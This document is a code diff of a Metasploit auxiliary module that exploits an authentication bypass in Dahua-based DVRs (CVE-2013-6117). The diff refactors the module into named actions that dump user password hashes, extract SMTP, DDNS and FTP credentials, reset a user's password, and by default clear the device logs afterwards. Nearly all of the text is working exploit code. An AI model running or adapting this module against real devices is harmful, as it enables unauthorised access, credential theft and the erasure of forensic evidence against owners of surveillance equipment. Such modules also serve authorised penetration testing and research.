@@ -15,22 +15,27 @@ class Metasploit3 < Msf::Auxiliary
         [ 'CVE', '2013-6117' ],
         [ 'URL', 'https://depthsecurity.com/blog/dahua-dvr-authentication-bypass-cve-2013-6117' ]
       ],
-      'License'         => MSF_LICENSE
-       )
+      'License'         => MSF_LICENSE,
+      'DefaultAction'  => 'VERSION',
+      'Actions'        =>
+        [
+          [ 'CHANNEL', { 'Description' => 'Obtain the channel/camera information from the DVR' } ],
+          [ 'DDNS', { 'Description' => 'Obtain the DDNS settings from the DVR' } ],
+          [ 'EMAIL', { 'Description' => 'Obtain the email settings from the DVR' } ],
+          [ 'GROUP', { 'Description' => 'Obtain the group information the DVR' } ],
+          [ 'NAS', { 'Description' => 'Obtain the NAS settings from the DVR' } ],
+          [ 'RESET', { 'Description' => 'Reset an existing user\'s password on the DVR' } ],
+          [ 'SERIAL', { 'Description' => 'Obtain the serial number from the DVR' } ],
+          [ 'USER', { 'Description' => 'Obtain the user information from the DVR' } ],
+          [ 'VERSION', { 'Description' => 'Obtain the version of the DVR' } ]
+        ]
+    )
+
     deregister_options('RHOST')
     register_options([
-      OptString.new('USERNAME', [true, 'A username to reset', '888888']),
+      OptString.new('USERNAME', [false, 'A username to reset', '888888']),
       OptString.new('PASSWORD', [false, 'A password to reset the user with, if not set a random pass will be generated.']),
-      OptBool.new('VERSION_INFO', ['false', 'Grabs the version of DVR', 'FALSE']),
-      OptBool.new('EMAIL_INFO', ['false', 'Grabs the email settings of the DVR', 'FALSE']),
-      OptBool.new('DDNS_INFO', ['false', 'Grabs the DDNS settings of the DVR', 'FALSE']),
-      OptBool.new('SN_INFO', ['false', 'Grabs the SN of the DVR', 'FALSE']),
-      OptBool.new('CHANNEL_INFO', ['false', 'Grabs the cameras and their assigned name', 'FALSE']),
-      OptBool.new('NAS_INFO', ['false', 'Grabs the NAS settings of the DVR', 'FALSE']),
-      OptBool.new('USER_INFO', ['true', 'Grabs the Users and hashes of the DVR', 'TRUE']),
-      OptBool.new('GROUP_INFO', ['false', 'Grabs the Users and groups of the DVR', 'FALSE']),
-      OptBool.new('RESET', [false, %q(Reset an existing user's pw?), 'FALSE']),
-      OptBool.new('CLEAR_LOGS', [true, %q(Clear the DVR logs when we're done?), 'TRUE']),
+      OptBool.new('CLEAR_LOGS', [true, %q(Clear the DVR logs when we're done?), true]),
       Opt::RPORT(37777)
     ])
   end
@@ -81,41 +86,41 @@ class Metasploit3 < Msf::Auxiliary
     data = sock.get_once
     if data =~ /[\x00]{8,}([[:print:]]+)/
       ver = Regexp.last_match[1]
-      print_status("Version: #{ver} @ #{rhost}:#{rport}!")
+      print_good("#{peer} -- version: #{ver}")
     end
   end
 
-  def grab_sn
+  def grab_serial
+    connect
     sock.put(SN)
     data = sock.get_once
     if data =~ /[\x00]{8,}([[:print:]]+)/
       serial = Regexp.last_match[1]
-      print_status("Serial Number: #{serial} @ #{rhost}:#{rport}!")
+      print_good("#{peer} -- serial number: #{serial}")
     end
   end
 
   def grab_email
     connect
     sock.put(EMAIL)
-    if data = sock.get_once.split('&&')
-      print_status("Email Settings: @ #{rhost}:#{rport}!")
-      if data[0] =~ /([\x00]{8,}(?=.{1,255}$)[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?(?:\.[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?)*\.?+:\d+)/
-        if mailhost = Regexp.last_match[1].split(':')
-          print_status("  Server: #{mailhost[0]}") unless mailhost[0].nil?
-          print_status("  Server Port: #{mailhost[1]}") unless mailhost[1].nil?
-          print_status("  Destination Email: #{data[1]}") unless mailhost[1].nil?
-        end
-          if !data[5].nil? && !data[6].nil?
-            print_good("  SMTP User: #{data[5]}") unless data[5].nil?
-            print_good("  SMTP Password: #{data[6]}") unless data[6].nil?
-            muser = "#{data[5]}"
-            mpass = "#{data[6]}"
-            mailserver = "#{mailhost[0]}"
-            mailport = "#{mailhost[1]}"
-            if !mailserver.to_s.strip.length == 0 && !mailport.to_s.strip.length == 0 && !muser.to_s.strip.length == 0 && !mpass.to_s.strip.length == 0
-              report_email_creds(mailserver, mailport, muser, mpass) if !mailserver.nil? && !mailport.nil? && !muser.nil? && !mpass.nil?
-            end
-          end
+    return unless (response = sock.get_once)
+    data = response.split('&&')
+    return unless data.first =~ /([\x00]{8,}(?=.{1,255}$)[0-9A-Z](?:(?:[0-9A-Z]|-){0,61}[0-9A-Z])?(?:\.[0-9A-Z](?:(?:[0-9A-Z]|-){0,61}[0-9A-Z])?)*\.?+:\d+)/i
+    print_status("Email Settings: @ #{rhost}:#{rport}!")
+    if mailhost = Regexp.last_match[1].split(':')
+      print_status("  Server: #{mailhost[0]}") unless mailhost[0].nil?
+      print_status("  Server Port: #{mailhost[1]}") unless mailhost[1].nil?
+      print_status("  Destination Email: #{data[1]}") unless mailhost[1].nil?
+    end
+    if !data[5].nil? && !data[6].nil?
+      print_good("  SMTP User: #{data[5]}") unless data[5].nil?
+      print_good("  SMTP Password: #{data[6]}") unless data[6].nil?
+      muser = "#{data[5]}"
+      mpass = "#{data[6]}"
+      mailserver = "#{mailhost[0]}"
+      mailport = "#{mailhost[1]}"
+      if !mailserver.to_s.strip.length == 0 && !mailport.to_s.strip.length == 0 && !muser.to_s.strip.length == 0 && !mpass.to_s.strip.length == 0
+        report_email_creds(mailserver, mailport, muser, mpass) if !mailserver.nil? && !mailport.nil? && !muser.nil? && !mpass.nil?
       end
     end
   end
@@ -123,28 +128,26 @@ class Metasploit3 < Msf::Auxiliary
   def grab_ddns
     connect
     sock.put(DDNS)
-    if data = sock.get_once
-      data = data.split(/&&[0-1]&&/)
-      data.each_with_index do |val, index|
-        if index > 0
-          val = val.split("&&")
-          ddns_service = "#{val[0]}"
-          ddns_server = "#{val[1]}"
-          ddns_port = "#{val[2]}"
-          ddns_domain = "#{val[3]}"
-          ddns_user = "#{val[4]}"
-          ddns_pass = "#{val[5]}"
-          print_status("DDNS Settings @ #{rhost}:#{rport}!:")
-          print_status("  DDNS Service: #{ddns_service}")
-          print_status("  DDNS Server:  #{ddns_server}")
-          print_status("  DDNS Port: #{ddns_port}")
-          print_status("  Domain: #{ddns_domain}")
-          print_good("  Username: #{ddns_user}")
-          print_good("  Password: #{ddns_pass}")
-          if !ddns_server.to_s.strip.length == 0 && !ddns_port.to_s.strip.length == 0 && !ddns_user.to_s.strip.length == 0 && !ddns_pass.to_s.strip.length == 0
-            report_ddns_cred(ddns_server, ddns_port, ddns_user, ddns_pass)
-          end
-        end
+    return unless (response = sock.get_once)
+    data = response.split(/&&[0-1]&&/)
+    data.each_with_index do |val, index|
+      next if index == 0
+      val = val.split("&&")
+      ddns_service = "#{val[0]}"
+      ddns_server = "#{val[1]}"
+      ddns_port = "#{val[2]}"
+      ddns_domain = "#{val[3]}"
+      ddns_user = "#{val[4]}"
+      ddns_pass = "#{val[5]}"
+      print_status("DDNS Settings @ #{rhost}:#{rport}!:")
+      print_status("  DDNS Service: #{ddns_service}")
+      print_status("  DDNS Server:  #{ddns_server}")
+      print_status("  DDNS Port: #{ddns_port}")
+      print_status("  Domain: #{ddns_domain}")
+      print_good("  Username: #{ddns_user}")
+      print_good("  Password: #{ddns_pass}")
+      if !ddns_server.to_s.strip.length == 0 && !ddns_port.to_s.strip.length == 0 && !ddns_user.to_s.strip.length == 0 && !ddns_pass.to_s.strip.length == 0
+        report_ddns_cred(ddns_server, ddns_port, ddns_user, ddns_pass)
       end
     end
   end
@@ -152,28 +155,29 @@ class Metasploit3 < Msf::Auxiliary
   def grab_nas
     connect
     sock.put(NAS)
-    if data = sock.get_once
-      print_status("Nas Settings @ #{rhost}:#{rport}!:")
-      server = ''
-      port = ''
-      if data =~ /[\x00]{8,}[\x01][\x00]{3,3}([\x0-9a-f]{4,4})([\x0-9a-f]{2,2})/
-        server = Regexp.last_match[1].unpack('C*').join('.')
-        port = Regexp.last_match[2].unpack('S')
-        print_status("  Nas Server #{server}")
-        print_status("  Nas Port: #{port}")
-      end
-      if data =~ /[\x00]{16,}(?<ftpuser>[[:print:]]+)[\x00]{16,}(?<ftppass>[[:print:]]+)/
+    return unless (data = sock.get_once)
+    print_status("Nas Settings @ #{rhost}:#{rport}!:")
+    server = ''
+    port = ''
+    if data =~ /[\x00]{8,}[\x01][\x00]{3,3}([\x0-9a-f]{4,4})([\x0-9a-f]{2,2})/
+      server = Regexp.last_match[1].unpack('C*').join('.')
+      port = Regexp.last_match[2].unpack('S')
+      print_status("  Nas Server #{server}")
+      print_status("  Nas Port: #{port}")
+    end
+    if /[\x00]{16,}(?<ftpuser>[[:print:]]+)[\x00]{16,}(?<ftppass>[[:print:]]+)/ =~ data
+      ftpuser.strip!
+      ftppass.strip!
+      unless ftpuser.blank? || ftppass.blank?
         print_good("  FTP User: #{ftpuser}")
         print_good("  FTP Password: #{ftppass}")
-        if !ftpuser.to_s.strip.length == 0 && ftppass.to_s.strip.length == 0
-          report_creds(
-            host: server,
-            port: port,
-            user: ftpuser,
-            pass: ftppass,
-            type: "FTP",
-            active: true) if !server.nil? && !port.nil? && !ftpuser.nil? && !ftppass.nil?
-        end
+        report_creds(
+          host: server,
+          port: port,
+          user: ftpuser,
+          pass: ftppass,
+          type: "FTP",
+          active: true) if !server.nil? && !port.nil? && !ftpuser.nil? && !ftppass.nil?
       end
     end
   end
@@ -184,51 +188,52 @@ class Metasploit3 < Msf::Auxiliary
     data = sock.get_once.split('&&')
     disconnect
     if data.length > 1
-      print_status("Camera Channels @ #{rhost}:#{rport}!:")
+      print_good("#{peer} -- camera channels:")
       data.each_with_index { |val, index| print_status("  #{index + 1}:#{val[/([[:print:]]+)/]}") }
     end
   end
 
   def grab_users
-    usercount = 0
     connect
     sock.put(USERS)
-    if data = sock.get_once.split('&&')
-      print_status("Users\\Hashed Passwords\\Rights\\Description: @ #{rhost}:#{rport}!")
-      data.each do |val|
-        usercount += 1
-        pass = "#{val[/(([\d]+)[:]([0-9A-Za-z]+)[:]([0-9A-Za-z]+))/]}"
-        value = pass.split(":")
-        user = "#{value[1]}"
-        md5hash = "#{value[2]}"
-        print_status("  #{val[/(([\d]+)[:]([[:print:]]+))/]}")
-        # Write the dahua hash to the database
-        hash = "#{rhost} #{user}:$dahua$#{md5hash}"
-        report_hash(rhost, rport, user, hash)
-        # Write the vulnerability to the database
-        report_vuln(
-          host: rhost,
-          port: rport,
-          proto: 'tcp',
-          sname: 'dvr',
-          name: 'Dahua Authentication Password Hash Exposure',
-          info: "Obtained password hash for user #{user}: #{md5hash}",
-          refs: references
-        )
-      end
+    return unless (response = sock.get_once)
+    data = response.split('&&')
+    usercount = 0
+    print_status("Users\\Hashed Passwords\\Rights\\Description: @ #{rhost}:#{rport}!")
+    data.each do |val|
+      usercount += 1
+      pass = "#{val[/(([\d]+)[:]([0-9A-Z]+)[:]([0-9A-Z]+))/i]}"
+      value = pass.split(":")
+      user = "#{value[1]}"
+      md5hash = "#{value[2]}"
+      print_status("  #{val[/(([\d]+)[:]([[:print:]]+))/]}")
+      # Write the dahua hash to the database
+      hash = "#{rhost} #{user}:$dahua$#{md5hash}"
+      report_hash(rhost, rport, user, hash)
+      # Write the vulnerability to the database
+      report_vuln(
+        host: rhost,
+        port: rport,
+        proto: 'tcp',
+        sname: 'dvr',
+        name: 'Dahua Authentication Password Hash Exposure',
+        info: "Obtained password hash for user #{user}: #{md5hash}",
+        refs: references
+      )
     end
   end
 
   def grab_groups
     connect
     sock.put(GROUPS)
-    if data = sock.get_once.split('&&')
-      print_status("User Groups: @ #{rhost}:#{rport}!")
-      data.each { |val| print_status("  #{val[/(([\d]+)[:]([\w]+))/]}") }
-    end
+    return unless (response = sock.get_once)
+    data = response.split('&&')
+    print_good("#{peer} -- groups:")
+    data.each { |val| print_status("  #{val[/(([\d]+)[:]([\w]+))/]}") }
   end
 
   def reset_user
+    connect
     userstring = datastore['USERNAME'] + ":Intel:" + @password + ":" + @password
     u1 = "\xa4\x00\x00\x00\x00\x00\x00\x00\x1a\x00\x00\x00\x00\x00\x00\x00" \
          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
@@ -239,69 +244,57 @@ class Metasploit3 < Msf::Auxiliary
     sock.put(u1)
     sock.put(u2)
     sock.put(u3)
-    data = sock.get_once
+    sock.get_once
     sock.put(u1)
-    if data = sock.get_once
-      print_good("PASSWORD RESET!: user #{datastore['USERNAME']}'s password reset to #{datastore['PASSWORD']}! @ #{rhost}:#{rport}!")
+    if sock.get_once
+      print_good("#{peer} -- user #{datastore['USERNAME']}'s password reset to #{@password}")
     end
   end
 
   def clear_logs
+    connect
     sock.put(CLEAR_LOGS1)
     sock.put(CLEAR_LOGS2)
-    print_good("LOGS CLEARED! @ #{rhost}:#{rport}")
+    print_good("#{peer} -- logs cleared")
+  end
+
+  def peer
+    "#{rhost}:#{rport}"
   end
 
   def run_host(ip)
-    # user8pwhash = "4WzwxXxM" #888888
-    # user6pwhash = "sh15yfFM" #666666
-    # useradminpwhash = "6QNMIQGe" #admin
-    connect
-    sock.put(U1)
-    data = sock.recv(8)
-    disconnect
-    if data == DVR_RESP
-      print_good("DVR FOUND: @ #{rhost}:#{rport}!")
+    begin
+      connect
+      sock.put(U1)
+      data = sock.recv(8)
+      disconnect
+      return unless data == DVR_RESP
+      print_good("#{peer} -- Dahua-based DVR found")
       report_service(host: rhost, port: rport, sname: 'dvr', info: "Dahua-based DVR")
-      # needs boolean logic to run or not run
-      if datastore['VERSION_INFO']
+
+      case action.name.upcase
+      when 'CHANNEL'
+        grab_channels
+      when 'DDNS'
+        grab_ddns
+      when 'EMAIL'
+        grab_email
+      when 'GROUP'
+        grab_groups
+      when 'NAS'
+        grab_nas
+      when 'RESET'
+        reset_user
+      when 'SERIAL'
+        grab_serial
+      when 'USER'
+        grab_users
+      when 'VERSION'
         grab_version
       end
-      # needs boolean logic to run or not run
-      if datastore['SN_INFO']
-        grab_sn
-      end
-      # needs boolean logic to run or not run
-      if datastore['EMAIL_INFO']
-        grab_email
-      end
-      # needs boolean logic to run or not run
-      if datastore['DDNS_INFO']
-        grab_ddns
-      end
-      # needs boolean logic to run or not run
-      if datastore['NAS_INFO']
-        grab_nas
-      end
-      # needs boolean logic to run or not run
-      if datastore['CHANNEL_INFO']
-        grab_channels
-      end
-      # needs boolean logic to run or not run
-      if datastore['USER_INFO']
-        grab_users
-      end
-      # needs boolean logic to run or not run
-      if datastore['GROUP_INFO']
-        grab_groups
-      end
-      if datastore['RESET']
-        reset_user
-      end
 
-      if datastore['CLEAR_LOGS']
-        clear_logs
-      end
+      clear_logs if datastore['CLEAR_LOGS']
+    ensure
       disconnect
     end
   end
